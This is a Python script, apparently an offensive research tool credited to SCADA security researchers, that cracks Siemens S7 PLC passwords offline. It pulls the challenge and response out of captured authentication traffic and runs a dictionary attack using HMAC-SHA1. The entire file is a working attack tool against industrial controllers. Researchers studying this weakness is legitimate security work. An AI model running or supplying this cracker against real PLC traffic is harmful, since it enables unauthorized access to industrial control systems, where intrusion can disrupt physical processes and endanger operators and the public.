"""
As posted on: http://pastebin.com/0G9Q2k6y

File: s7-cracker.py
Desc: offline password bruteforsing based on challenge-response data, extracted from auth traffic dump file

Installing (scapy) pcapy on Windows for Python 2.7:

See: http://stackoverflow.com/a/23279252

Download and install http://dirk-loss.de/scapy/dnet-1.12.win32-py2.7.exe and http://code.google.com/p/pypcap/issues/detail?id=36



Original authors:

Alexander Timorin, Dmitry Sklyarov
http://scadastrangelove.org

As posted on: http://pastebin.com/0G9Q2k6y

Version: 0.1 (just for demo, don't kick my ass plz)
"""

import argparse
import sys
import hashlib
import hmac
from binascii import hexlify

try:
    from scapy.all import *
except ImportError:
    print "please install scapy: http://www.secdev.org/projects/scapy/ "
    sys.exit()


def get_challenge_response(cfg_pcap_file):
    r = rdpcap(cfg_pcap_file)

    lens = map(lambda x: x.len, r)
    pckt_lens = dict([(i, lens[i]) for i in range(0,len(lens))])

    # try to find challenge packet
    pckt_108 = 0 #challenge packet (from server)
    for (pckt_indx, pckt_len) in pckt_lens.items():
        if pckt_len+14 == 108 and hexlify(r[pckt_indx].load)[14:24] == '7202002732':
            pckt_108 = pckt_indx
            break

    # try to find response packet
    pckt_141 = 0 #response packet (from client)
    _t1 = dict([ (i, lens[i]) for i in pckt_lens.keys()[pckt_108:] ])
    for pckt_indx in sorted(_t1.keys()):
        pckt_len = _t1[pckt_indx]
        if pckt_len+14 == 141 and hexlify(r[pckt_indx].load)[14:24] == '7202004831':
            pckt_141 = pckt_indx
            break

    # try to find auth result packet
    pckt_84 = 0 # auth answer from plc: pckt_len==84 -> auth ok
    pckt_92 = 0 # auth answer from plc: pckt_len==92 -> auth bad
    for pckt_indx in sorted(_t1.keys()):
        pckt_len = _t1[pckt_indx]
        if pckt_len+14 == 84 and hexlify(r[pckt_indx].load)[14:24] == '7202000f32':
            pckt_84 = pckt_indx
            break
        if pckt_len+14 == 92 and hexlify(r[pckt_indx].load)[14:24] == '7202001732':
            pckt_92 = pckt_indx
            break

    print "found packets indeces: pckt_108=%d, pckt_141=%d, pckt_84=%d, pckt_92=%d" % (pckt_108, pckt_141, pckt_84, pckt_92)
    if pckt_84:
        print "auth ok"
    else:
        print "auth bad. for brute we need right auth result. exit"
        sys.exit()

    challenge = None
    response = None

    raw_challenge = hexlify(r[pckt_108].load)
    if raw_challenge[46:52] == '100214' and raw_challenge[92:94] == '00':
        challenge = raw_challenge[52:92]
        print "found challenge: %s" % challenge
    else:
        print "cannot find challenge. exit"
        sys.exit()

    raw_response = hexlify(r[pckt_141].load)
    if raw_response[64:70] == '100214' and raw_response[110:112] == '00':
        response = raw_response[70:110]
        print "found  response: %s" % response
    else:
        print "cannot find response. exit"
        sys.exit()

    return challenge, response

def calculate_s7response(password, challenge):
    challenge = challenge.decode("hex")
    return hmac.new( hashlib.sha1(password).digest(), challenge, hashlib.sha1).hexdigest()

if __name__ == '__main__':

    parser = argparse.ArgumentParser(description='Crack S7 password using a dictionary')
    parser.add_argument('file', metavar='FILE', type=str, help='A PCAP file containing S7 traffic')
    parser.add_argument('dict', metavar='DICT', type=str, help='Dictionary to use when cracking')
    args = parser.parse_args()

    print "using pcap file: %s" % args.file
    challenge, response = get_challenge_response(args.file)
    print "start password bruteforsing  ..."
    for p in open(args.dict):
        p = p.strip()
        if response == calculate_s7response(p, challenge):
            print "found password: %s" % p
            sys.exit()
    print "password not found. try another dictionary."